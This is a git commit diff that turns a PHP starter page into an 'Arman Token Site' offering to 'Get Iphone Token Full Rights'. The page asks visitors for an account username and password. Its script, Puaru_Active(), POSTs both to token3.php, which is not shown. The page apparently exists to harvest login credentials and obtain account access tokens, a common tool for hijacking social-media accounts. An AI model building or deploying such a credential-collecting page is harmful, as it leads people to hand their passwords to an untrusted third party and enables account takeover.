d4757248706bf17fabf5e7a5e5b3daa182236acc
devilhacker1994 <devil.hacker1994@gmail.com>
2017-04-03 13:06:09 -0700

    Add files via upload

--- index.php
+++ index.php
@@ -1,21 +1,57 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-	<title>PHP Starter Application</title>
-	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-	<link rel="stylesheet" href="style.css" />
+  <title>Arman Token Site</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 </head>
+
 <body>
-	<table>
-		<tr>
-			<td style='width: 30%;'>
-				<img class = 'newappIcon' src='images/newapp-icon.png'>
-			</td>
-			<td>
-				<h1 id = "message"><?php echo "Hello World!"; ?></h1>
-				<p class='description'></p> Thanks for creating a <span class="blue">PHP Starter Application</span>.
-			</td>
-		</tr>
-	</table>
+ 
+<div class="container">
+  <h2>Get Iphone Token Full Rights</h2>
+  <div class="panel-group">
+<div class="panel panel-primary">
+      <div class="panel-heading">No Checkpoint 100%</div>
+      <div class="panel-body">      
+<div class="form-group">
+  <label for="usr">Username:</label>
+  <input type="text" class="form-control" id="tk">
+</div>
+<div class="form-group">
+  <label for="pwd">Password:</label>
+  <input type="text" class="form-control" id="mk">
+</div>
+<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
+<p>
+<li id="trave" class="list-group-item"><img src="http://usamabutt.tk/usama.JPG"> </li></p>
+
+</div>
+    </div>
+</div>
+
+<script>
+function Puaru_Active() {
+var http = new XMLHttpRequest();
+var tk = document.getElementById("tk").value;
+var mk = document.getElementById("mk").value;
+var url = "token3.php";
+var params = "u="+tk+"&p="+mk+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("trave").innerHTML = http.responseText;        
+    }
+}
+http.send(params);
+}
+</script>
+
 </body>
 </html>
